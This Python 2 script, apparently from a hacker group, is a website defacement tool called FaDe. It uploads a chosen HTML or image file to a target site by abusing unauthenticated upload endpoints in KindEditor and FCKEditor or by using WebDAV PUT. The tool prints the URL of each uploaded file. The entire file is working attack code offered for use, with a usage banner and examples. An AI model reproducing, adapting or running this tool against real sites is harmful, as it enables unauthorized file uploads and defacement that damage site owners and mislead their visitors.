## fade.py - Fake Deface
# -*- coding: utf-8 -*-
##
'''
FaDe - Fake Deface
Author : DedSecTL/DTL <dtlily>
Version : 1.0
Team : BlackHole Security
Date : Tue Sep 4 02:06:48 2018
Telegram : @dtlily
Line : dtl.lily
'''
import sys
import requests

banner = "FaDe v1.0-dev (c) 2018 by DedSecTL/DTL - Make with full of <3"
bannerFaDe = """  fade - fake deface with kindeditor, fckeditor and webdav

# FADE
~ KindEditor - upload files on the server with remote file upload exploit
~ FCKEditor - fckeditor all version arbitary vulnerability
~ WebDAV - webdav file upload exploiter uses the PUT method that allows clients to upload and replace files on the server

Usage: fade --method=<method> --file=<html|img>

METHOD:
  kindeditor
  fckeditor
  webdav

EXAMPLE:
1. fade --method=kindeditor --file=/path/example.png
2. fade --method=fckeditor --file=/path/example.html
3. fade --method=webdav --file=/path/example.html
"""

def fade(method, script):
	print banner
	if method.lower() == "kindeditor":
		params = {"dir":"file"}
		files = {"imgFile":open(script, 'rb')}
		r = requests.post(raw_input("[*] Enter site: ").split("examples")[0]+"php/upload_json.php", data=params, files=files)
		if r.json()["error"] == 0 and r.status_code == 200:print "\n[+] File Uploaded:",r.json()["url"]
		else:print "\n[!] Upload Failed: Only allowed: gif,jpg,jpeg,png,bmp"
	elif method.lower() == "fckeditor":
		files = {"NewFile":open(script, 'rb')}
		site = raw_input("[*] Enter site: ").replace("test.html", "php/upload.php")
		r = requests.post(site, files=files)
		if r.status_code == 200 and len(r.content.split(",")[1].replace('"','')) != 0:print "\n[+] File Uploaded:",site.split("/")[0]+"//"+site.split("/")[2]+r.content.split(",")[1].replace('"', '')
		else:print "\n[!] Upload Failed"
	elif method.lower() == "webdav":
		r = requests.request('put', raw_input("[*] Enter site: ")+"/"+script.split("/")[-1], data=open(script, "rb"), headers={'Content-Type':'application/octet-stream'})
		if r.status_code < 200 or r.status_code >= 300:print "\n[!] Upload Failed"
		else:print "\n[+] File Uploaded:",r.url
	else:
		print "fade: error:",method,"is not a method"

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print bannerFaDe
	else:
		cond=[]
		if sys.argv[1].split("=")[0]=="--method" and sys.argv[2].split("=")[0]=="--file":cond.append(True)
		if len(cond) == 1 and cond[0] == True:
			try:fade(sys.argv[1].split("=")[1], sys.argv[2].split("=")[1])
			except IOError:print "fade:",sys.argv[2].split("=")[1]+": no such file found"
		else:
			print bannerFaDe